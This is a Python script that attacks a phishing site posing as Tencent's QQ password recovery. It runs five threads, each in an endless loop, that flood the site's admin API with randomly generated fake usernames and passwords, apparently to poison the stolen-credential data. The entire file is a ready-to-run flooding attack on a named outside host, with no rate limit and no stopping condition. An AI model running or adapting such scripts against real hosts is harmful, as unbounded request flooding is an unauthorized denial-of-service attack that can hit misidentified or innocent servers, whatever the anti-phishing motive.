#! usr/bin/env python
# -*- coding: utf-8 -*-
# Author: zhang xiong
# Time: 2018/5/11

'''
网址：http://df.keuizvn.xyz/at.html?046.jSjUs
主要技术：post提交，多线程
这是一个假冒腾讯找回QQ密码的假冒网站，通过随机生成QQ账号和密码，来达到攻击的目的
'''

import requests
from threading import Thread
import random

def process():
    url = "http://1526022764000.hsvtgy.xyz/admin/api.php?user=jSjUs"
    username = "".join([random.choice("1234567890") for i in range(8)])
    password = "".join([random.choice("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM") for i in range(8)])
    data = {"username": username,
            "password": password}
    response = requests.post(url=url, data=data)
    print(response.status_code)
    print("username:%s" % username, "password:%s" % password)

def not_stop():
    while True:
        process()

if __name__ == '__main__':
    thread_list = []
    for i in range(5):
        t = Thread(target=not_stop)
        thread_list.append(t)
    for tp in thread_list:
        tp.start()



